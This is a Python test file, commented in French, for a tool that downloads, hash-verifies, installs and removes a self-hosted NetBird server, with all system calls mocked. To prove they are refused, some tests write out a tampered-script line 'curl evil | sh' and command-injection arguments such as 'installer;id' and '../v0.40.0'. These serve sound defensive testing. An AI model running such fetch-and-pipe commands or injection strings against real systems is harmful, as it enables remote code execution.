# ══════════════════════════════════════════════════════════════════════════════
# TITRE      : Bancs de la commande root `serveur` du module netbird
# LICENCE    : AGPL-3.0
# AUTEUR     : Atek Drisse
# GIT        : github.com/Marplestrange
# MAIL       : marplestrange@cassandra.center
# MODULE     : tests
# ZONE       : CN
# VERSION CN : 0.1.0  #245ae6
# VERSION EC : néant
# EC LIÉES   : néant
# RÔLE       : Bancs de la commande root `serveur` du module netbird : installer, mettre à jour et retirer un SERVEUR NetBird auto-hébergé. Ni Docker, ni réseau, ni ports ici : `executer`, `ouvrir`, `port_libre` et `shutil` sont remplacés ; le dossier du 
# MÉTHODE    : à compléter par l'auteur (comment le fichier s'y prend)
# ══════════════════════════════════════════════════════════════════════════════
# ▼▼▼ BORNE CN version=0.1.0 empreinte=245ae6 ▼▼▼
"""Bancs de la commande root `serveur` du module netbird : installer, mettre à jour et retirer un SERVEUR NetBird auto-hébergé. Ni Docker, ni réseau, ni ports ici : `executer`, `ouvrir`,
`port_libre` et `shutil` sont remplacés ; le dossier du serveur est un dossier temporaire. On vérifie surtout ce qui est REFUSÉ et que le script n'est lancé que s'il est celui qu'on a confirmé."""
import hashlib
import importlib.machinery
import importlib.util
import json
import socket
import sys
import subprocess
import os
import tempfile
import types
import unittest
from pathlib import Path

RACINE = Path(__file__).resolve().parent.parent
SCRIPT = b"#!/bin/bash\necho 'installation NetBird'\n"
SHA = hashlib.sha256(SCRIPT).hexdigest()


def charger():
    chemin = str(RACINE / "modules" / "netbird" / "commandes" / "CN_serveur")
    l = importlib.machinery.SourceFileLoader("serveur_banc", chemin)
    s = importlib.util.spec_from_loader("serveur_banc", l)
    m = importlib.util.module_from_spec(s)
    l.exec_module(m)
    return m


class Monde(unittest.TestCase):
    def setUp(self):
        self.m = charger()
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.dossier = str(Path(self.tmp.name) / "netbird-serveur")
        self.m.DOSSIER = self.dossier
        self.cmds, self.envs, self.urls = [], [], []
        self.sorties = {}                                     # début de commande -> (code, sortie)
        self.occupes = set()                                  # ("tcp", 80)…
        self.docker = self.jq = True
        self.corps = SCRIPT
        self.m.executer = self.faux
        self.m.ouvrir = self.faux_ouvrir
        self.m.port_libre = lambda proto, port: (proto, port) not in self.occupes
        self.m.shutil = types.SimpleNamespace(which=lambda x: "/usr/bin/" + x if (x == "docker" and self.docker) or (x == "jq" and self.jq) else None, rmtree=__import__("shutil").rmtree)

    def faux(self, commande, capture_output=True, text=True, timeout=0, cwd=None, env=None):
        self.cmds.append(list(commande))
        self.envs.append(env or {})
        for debut, (code, sortie) in self.sorties.items():
            if " ".join(commande).startswith(debut):
                return types.SimpleNamespace(returncode=code, stdout=sortie, stderr="")
        return types.SimpleNamespace(returncode=0, stdout="ok", stderr="")

    def faux_ouvrir(self, url, timeout=0):
        self.urls.append(url)
        corps = self.corps

        class R:
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def read(self, n=-1):
                return corps[:n] if n and n > 0 else corps
        return R()

    def lance(self, *argv):
        return self.m.serveur(list(argv))

    def poser(self, **meta):
        """Un serveur déjà posé."""
        os.makedirs(self.dossier, exist_ok=True)
        Path(self.dossier, "cassandra.json").write_text(json.dumps(dict({"version": "v0.40.0", "domaine": "netbird.exemple.fr", "proxy": "nginx"}, **meta)))

    def telecharge(self):
        self.assertTrue(self.lance("telecharger", "v0.40.0")["ok"])
        self.cmds.clear()


class Refus(Monde):
    def test_un_verbe_hors_table_est_refuse(self):
        for v in ("rm", "bash", "", "installer;id"):
            self.assertFalse(self.lance(v)["ok"], v)
        self.assertFalse(self.cmds)

    def test_la_version_est_explicite(self):
        for v in ("latest", "0.40.0", "v0.40", "v0.40.0;id", "v1.2.3.4", "../v0.40.0", ""):
            self.assertFalse(self.lance("telecharger", v)["ok"], v)
        self.assertFalse(self.urls, "rien n'est téléchargé pour une version illisible")

    def test_installer_refuse_les_arguments_suspects(self):
        self.telecharge()
        base = ["v0.40.0", SHA, "netbird.exemple.fr", "admin@exemple.fr", "nginx"]
        for i, mauvais in ((0, "latest"), (1, "abc"), (1, "G" * 64), (2, "pas un domaine"), (2, "192.168.1.5"), (2, "a;b.fr"), (2, "netbird.example.com"), (2, "x.test"),
                           (3, "pas-un-mail"), (3, "a b@c.fr"), (4, "apache"), (4, "traefik;id")):
            argv = list(base)
            argv[i] = mauvais
            self.assertFalse(self.lance("installer", *argv)["ok"], (i, mauvais))
        self.assertFalse(self.lance("installer", *base[:4])["ok"], "il manque le proxy")
        self.assertFalse(self.cmds, "aucune commande lancée")


class Telecharger(Monde):
    def test_le_script_est_pose_et_son_empreinte_rendue(self):
        r = self.lance("telecharger", "v0.40.0")
        self.assertTrue(r["ok"], r)
        self.assertEqual((r["sha256"], r["taille"], r["version"]), (SHA, len(SCRIPT), "v0.40.0"))
        self.assertEqual(self.urls, ["https://github.com/netbirdio/netbird/releases/download/v0.40.0/getting-started.sh"])
        chemin = Path(self.dossier, "getting-started.sh")
        self.assertEqual(chemin.read_bytes(), SCRIPT)
        if os.name == "posix":
            self.assertEqual(oct(chemin.stat().st_mode & 0o777), "0o600", "ni lisible ni exécutable par les autres")

    def test_un_script_vide_ou_demesure_est_refuse(self):
        for corps in (b"", b"x" * 300001):
            self.corps = corps
            self.assertFalse(self.lance("telecharger", "v0.40.0")["ok"])

    def test_un_serveur_deja_pose_n_est_pas_retelecharge(self):
        self.poser()
        r = self.lance("telecharger", "v0.40.0")
        self.assertFalse(r["ok"])
        self.assertIn("déjà posé", r["erreur"])
        self.assertFalse(self.urls)


class Installer(Monde):
    ARGS = ("installer", "v0.40.0", SHA, "netbird.exemple.fr", "admin@exemple.fr")

    def test_le_script_n_est_lance_que_s_il_est_celui_qu_on_a_confirme(self):
        self.telecharge()
        Path(self.dossier, "getting-started.sh").write_bytes(SCRIPT + b"curl evil | sh\n")      # changé après la confirmation
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("n'est pas celle que tu as confirmée", r["erreur"])
        self.assertFalse(self.cmds, "le script modifié n'est pas exécuté")
        self.assertFalse(Path(self.dossier, "cassandra.json").exists())

    def test_sans_telechargement_rien_n_est_lance(self):
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("telecharger", r["erreur"])
        self.assertFalse(self.cmds)

    def test_nginx_le_serveur_sans_question_et_sans_cle_ni_secret_en_ligne_de_commande(self):
        self.telecharge()
        r = self.lance(*self.ARGS, "nginx")
        self.assertTrue(r["ok"], r)
        self.assertEqual(len(self.cmds), 1)
        self.assertEqual(self.cmds[0][0], "bash")
        self.assertTrue(self.cmds[0][1].startswith(os.path.join(self.dossier, ".installer-")), "une copie neuve de ce qui a été haché, pas le fichier que bash rouvrirait")
        self.assertFalse(Path(self.cmds[0][1]).exists(), "la copie est effacée après le lancement")
        env = self.envs[0]
        self.assertEqual((env["NETBIRD_DOMAIN"], env["NETBIRD_NON_INTERACTIVE"], env["NETBIRD_REVERSE_PROXY_TYPE"], env["NETBIRD_ENABLE_PROXY"], env["NETBIRD_ENABLE_CROWDSEC"]),
                         ("netbird.exemple.fr", "true", "2", "false", "false"))
        self.assertNotIn("NETBIRD_LETSENCRYPT_EMAIL", env, "l'e-mail Let's Encrypt ne sert qu'au Traefik intégré")
        self.assertFalse([k for k in env if k not in ("PATH", "HOME", "LANG") and not k.startswith("NETBIRD_")], "l'environnement est construit ici, pas reçu")
        meta = json.loads(Path(self.dossier, "cassandra.json").read_text())
        self.assertEqual((meta["version"], meta["domaine"], meta["proxy"], meta["sha256"]), ("v0.40.0", "netbird.exemple.fr", "nginx", SHA))

    def test_traefik_exige_les_ports_80_et_443_libres(self):
        self.telecharge()
        self.occupes = {("tcp", 443)}
        r = self.lance(*self.ARGS, "traefik")
        self.assertFalse(r["ok"])
        self.assertIn("443/tcp", r["erreur"])
        self.assertIn("nginx", r["erreur"], "il dit quoi choisir à la place")
        self.assertFalse(self.cmds)
        self.occupes = set()
        self.assertTrue(self.lance(*self.ARGS, "traefik")["ok"])
        env = self.envs[-1]
        self.assertEqual((env["NETBIRD_REVERSE_PROXY_TYPE"], env["NETBIRD_LETSENCRYPT_EMAIL"]), ("0", "admin@exemple.fr"))

    def test_avec_un_proxy_existant_les_ports_80_et_443_ne_gênent_pas_mais_le_stun_oui(self):
        self.telecharge()
        self.occupes = {("tcp", 80), ("tcp", 443)}
        self.assertTrue(self.lance(*self.ARGS, "caddy")["ok"])
        self.assertEqual(self.envs[-1]["NETBIRD_REVERSE_PROXY_TYPE"], "4")
        Path(self.dossier, "cassandra.json").unlink()
        self.occupes = {("udp", 3478)}
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("3478/udp", r["erreur"])

    def test_sans_docker_ou_sans_jq(self):
        self.telecharge()
        self.docker = False
        self.assertIn("Docker", self.lance(*self.ARGS, "nginx")["erreur"])
        self.docker, self.jq = True, False
        self.assertIn("jq", self.lance(*self.ARGS, "nginx")["erreur"])
        self.assertFalse(self.cmds)

    def test_un_serveur_n_est_jamais_ecrase(self):
        self.telecharge()
        self.poser()
        self.assertIn("jamais écrasé", self.lance(*self.ARGS, "nginx")["erreur"])
        Path(self.dossier, "cassandra.json").unlink()
        Path(self.dossier, "config.yaml").write_text("x")                                      # une installation faite sans Cassandra
        self.assertIn("jamais écrasé", self.lance(*self.ARGS, "nginx")["erreur"])
        self.assertFalse(self.cmds)

    def test_un_script_qui_echoue_laisse_une_marque_qui_permet_de_le_retirer(self):
        self.telecharge()
        self.sorties["bash"] = (1, "Error: Docker socket not readable")
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("Docker socket", r["sortie"])
        self.assertEqual(json.loads(Path(self.dossier, "cassandra.json").read_text())["etat"], "echec")
        e = self.lance("etat")
        self.assertTrue(e["installe"] and e["partiel"], "l'état dit qu'une installation est inachevée")
        self.assertIn("inachevée", self.lance(*self.ARGS, "nginx")["erreur"], "on ne réinstalle pas par-dessus")
        Path(self.dossier, "config.yaml").write_text("x")                                      # ce que le script avait eu le temps de poser
        r = self.lance("retirer", "purger")
        self.assertTrue(r["ok"] and r["purge"], r)
        self.assertFalse(Path(self.dossier).exists(), "plus rien ne bloque une nouvelle installation")

    def test_un_reste_sans_pile_se_retire_meme_sans_docker_compose(self):
        self.telecharge()
        self.sorties["bash"] = (1, "Error")
        self.lance(*self.ARGS, "nginx")
        self.cmds.clear()
        r = self.lance("retirer")                                                              # même sans « purger » : il n'y a rien à garder
        self.assertTrue(r["ok"] and r["purge"], r)
        self.assertFalse([c for c in self.cmds if c[:2] == ["docker", "compose"]], "pas de docker-compose.yml : rien à arrêter")

    def test_un_delai_depasse_laisse_aussi_une_marque(self):
        self.telecharge()

        def lent(commande, **kw):
            raise subprocess.TimeoutExpired(commande, 1)
        self.m.executer = lent
        r = self.lance(*self.ARGS, "nginx")
        self.assertEqual(r["erreur"], "délai dépassé")
        self.assertEqual(json.loads(Path(self.dossier, "cassandra.json").read_text())["etat"], "echec")
        self.assertFalse(list(Path(self.dossier).glob(".installer-*")), "la copie du script ne traîne pas")

    def test_la_marque_d_un_succes_dit_ok_et_une_marque_ancienne_vaut_ok(self):
        self.telecharge()
        self.assertTrue(self.lance(*self.ARGS, "nginx")["ok"])
        self.assertEqual(json.loads(Path(self.dossier, "cassandra.json").read_text())["etat"], "ok")
        self.assertFalse(self.lance("etat")["partiel"])
        self.poser()                                                                           # sans « etat » : posée avant ce réglage
        self.assertFalse(self.lance("etat")["partiel"])

    def test_derriere_nginx_ou_caddy_les_ports_8080_et_8081_doivent_etre_libres(self):
        self.telecharge()
        self.occupes = {("tcp", 8080)}
        for proxy in ("nginx", "caddy"):
            r = self.lance(*self.ARGS, proxy)
            self.assertFalse(r["ok"], proxy)
            self.assertIn("8080/tcp", r["erreur"])
            self.assertIn("127.0.0.1", r["erreur"])
        self.assertFalse(self.cmds, "rien n'est lancé : on ne laisse pas une pile à moitié posée")
        self.occupes = {("tcp", 8080)}
        self.assertTrue(self.lance(*self.ARGS, "traefik")["ok"], "avec traefik, 8080 ne gêne pas")

    def test_les_tld_punycode_passent_et_les_domaines_reserves_non(self):
        self.telecharge()
        for ok in ("netbird.exemple.xn--p1ai", "netbird.exemple.fr"):
            self.assertTrue(self.m.DOMAINE.match(ok), ok)
        for mauvais in ("netbird.local", "x.invalid", "x.localhost", "x.example.org", "example.org"):
            r = self.lance("installer", "v0.40.0", SHA, mauvais, "admin@exemple.fr", "nginx")
            self.assertFalse(r["ok"], mauvais)
            self.assertFalse(self.cmds, mauvais)



class PortsReels(unittest.TestCase):
    @unittest.skipIf(sys.platform == "win32", "SO_REUSEADDR n'a pas le même sens sous Windows : le banc vise la machine du serveur")
    def test_un_port_en_ecoute_est_pris_ipv4_ou_ipv6_et_un_port_libre_ne_l_est_pas(self):
        m = charger()
        v4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addCleanup(v4.close)
        v4.bind(("0.0.0.0", 0))
        v4.listen(1)
        self.assertFalse(m.port_libre("tcp", v4.getsockname()[1]), "écoute IPv4")
        try:
            v6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        except OSError:
            self.skipTest("pas d'IPv6 ici")
        self.addCleanup(v6.close)
        v6.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
        v6.bind(("::", 0))
        v6.listen(1)
        self.assertFalse(m.port_libre("tcp", v6.getsockname()[1]), "écoute IPv6 seule")
        libre = socket.socket()
        libre.bind(("0.0.0.0", 0))
        port = libre.getsockname()[1]
        libre.close()                                                                          # le port vient d'être fermé : en TIME_WAIT ou non, il est libre
        self.assertTrue(m.port_libre("tcp", port))


class Exploitation(Monde):

    def test_etat_sans_serveur_et_avec(self):
        r = self.lance("etat")
        self.assertEqual((r["installe"], r["docker"], r["jq"], r["conteneurs"]), (False, True, True, []))
        self.poser()
        self.sorties["docker compose"] = (0, '{"Service":"netbird-server","State":"running","Image":"netbirdio/netbird-server:latest"}\n{"Service":"dashboard","State":"exited","Image":"netbirdio/dashboard:latest"}')
        r = self.lance("etat")
        self.assertEqual((r["installe"], r["meta"]["domaine"], [(c["service"], c["etat"]) for c in r["conteneurs"]]), (True, "netbird.exemple.fr", [("netbird-server", "running"), ("dashboard", "exited")]))

    def test_etat_dit_les_ports_pris_avant_l_installation(self):
        self.occupes = {("tcp", 443), ("udp", 3478)}
        r = self.lance("etat")
        self.assertEqual(sorted(r["occupes"]), ["tcp/443", "udp/3478"])

    def test_etat_installe_ne_cherche_plus_les_ports_mais_rend_ceux_des_conteneurs(self):
        self.poser()
        self.sorties["docker compose"] = (0, '{"Service":"netbird-server","State":"running","Image":"i","Publishers":[{"URL":"127.0.0.1","TargetPort":80,"PublishedPort":8081,"Protocol":"tcp"},{"URL":"::","TargetPort":3478,"PublishedPort":0,"Protocol":"udp"}]}')
        r = self.lance("etat")
        self.assertNotIn("occupes", r)
        self.assertEqual(r["conteneurs"][0]["ports"], ["127.0.0.1:8081->80/tcp"])

    def test_etat_garde_tous_les_services_meme_quand_la_sortie_est_longue(self):
        self.poser()
        etiquettes = {"com.docker.compose.%d" % i: "x" * 80 for i in range(8)}
        lignes = [json.dumps({"Service": "svc%d" % i, "State": "running", "Image": "img:%d" % i, "Labels": etiquettes}) for i in range(7)]
        self.sorties["docker compose"] = (0, "\n".join(lignes))
        self.assertGreater(len("\n".join(lignes)), 4000, "la sortie dépasse la limite des autres commandes")
        self.assertEqual([c["service"] for c in self.lance("etat")["conteneurs"]], ["svc%d" % i for i in range(7)])

    def test_etat_lit_aussi_un_tableau_json(self):

        self.poser()
        self.sorties["docker compose"] = (0, '[{"Service":"traefik","State":"running","Image":"traefik:v3"}]')
        self.assertEqual([c["service"] for c in self.lance("etat")["conteneurs"]], ["traefik"])

    def test_commande_table_fermee(self):
        self.poser()
        for act in ("up", "down", "restart", "logs"):
            self.assertTrue(self.lance("commande", act)["ok"], act)
        attendu = [["up", "-d"], ["down"], ["restart"], ["logs", "--tail", "80", "--no-color"]]
        self.assertEqual([c[4:] for c in self.cmds], attendu)
        self.assertTrue(all(c[:3] == ["docker", "compose", "-f"] for c in self.cmds))
        self.cmds.clear()
        for mauvais in (("exec",), ("up", "-d"), ("rm", "-f"), ()):
            self.assertFalse(self.lance("commande", *mauvais)["ok"], mauvais)
        self.assertFalse(self.cmds)

    def test_sans_serveur_pose_rien_ne_se_lance(self):
        for argv in (("commande", "up"), ("mettre_a_jour",), ("retirer",), ("nginx",)):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.assertFalse(self.cmds)

    def test_mettre_a_jour_tire_les_images_puis_relance_et_s_arrete_au_premier_echec(self):
        self.poser()
        self.assertTrue(self.lance("mettre_a_jour")["ok"])
        self.assertEqual([c[4:] for c in self.cmds], [["pull"], ["up", "-d"]])
        self.cmds.clear()
        self.sorties["docker compose -f " + os.path.join(self.dossier, "docker-compose.yml") + " pull"] = (1, "pull access denied")
        r = self.lance("mettre_a_jour")
        self.assertFalse(r["ok"])
        self.assertEqual([c[4:] for c in self.cmds], [["pull"]], "pas de `up` sur des images qui ne sont pas venues")

    def test_la_conf_nginx_se_lit(self):
        self.poser()
        self.assertIn("proxy", self.lance("nginx")["erreur"])
        Path(self.dossier, "nginx-netbird.conf").write_text("server { listen 443 ssl; }")
        self.assertEqual(self.lance("nginx")["conf"], "server { listen 443 ssl; }")

    def test_retirer_garde_les_volumes_sauf_purge(self):
        self.poser()
        self.assertTrue(self.lance("retirer")["ok"])
        self.assertEqual([c[4:] for c in self.cmds], [["down"]])
        self.assertTrue(Path(self.dossier, "cassandra.json").exists(), "sans purge, le dossier et ce que Cassandra en sait restent")
        self.cmds.clear()
        r = self.lance("retirer", "purger")
        self.assertTrue(r["ok"] and r["purge"])
        self.assertEqual([c[4:] for c in self.cmds], [["down", "-v", "--remove-orphans"]])
        self.assertFalse(Path(self.dossier).exists())

    def test_retirer_refuse_ce_qui_n_est_pas_un_usage(self):
        self.poser()
        for argv in (("retirer", "tout"), ("retirer", "purger", "x")):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.assertFalse(self.cmds)

    def test_une_purge_dont_le_dossier_resiste_le_dit_sans_echouer(self):
        self.poser()

        def refuse(chemin):
            raise PermissionError("verrouillé")
        self.m.shutil = types.SimpleNamespace(which=self.m.shutil.which, rmtree=refuse)
        r = self.lance("retirer", "purger")
        self.assertTrue(r["ok"] and r["purge"], "les volumes sont détruits : le retrait a eu lieu")
        self.assertIn("à retirer à la main", r["avertissement"])
        self.assertFalse(Path(self.dossier, "cassandra.json").exists(), "plus de marque : le serveur n'est plus donné pour posé")

    def test_un_retrait_qui_echoue_ne_supprime_rien(self):

        self.poser()
        self.sorties["docker compose"] = (1, "Cannot connect to the Docker daemon")
        r = self.lance("retirer", "purger")
        self.assertFalse(r["ok"])
        self.assertTrue(Path(self.dossier, "cassandra.json").exists(), "on ne supprime pas le dossier d'une pile qu'on n'a pas pu arrêter")

    def test_un_lien_symbolique_a_la_place_du_dossier_est_refuse(self):
        cible = Path(self.tmp.name) / "ailleurs"
        cible.mkdir()
        try:
            os.symlink(cible, self.dossier)
        except (OSError, NotImplementedError):
            self.skipTest("liens symboliques non permis ici")
        (cible / "cassandra.json").write_text("{}")
        for argv in (("retirer", "purger"), ("telecharger", "v0.40.0")):
            r = self.lance(*argv)
            self.assertFalse(r["ok"], argv)
        self.assertTrue(cible.exists(), "la cible du lien n'est jamais supprimée")


if __name__ == "__main__":
    unittest.main()
# ▲▲▲ FIN BORNE CN ▲▲▲

# ═══ EXPLICATIF CN / EC ═══════════════════════════════════════════════════════
# CN : tout ce fichier est du nexus : charger, Monde, Refus, Telecharger, Installer, Exploitation
# EC : néant (aucun point d'évolution déclaré pour l'instant)
# LIEN : à compléter (contrat, fichiers voisins)
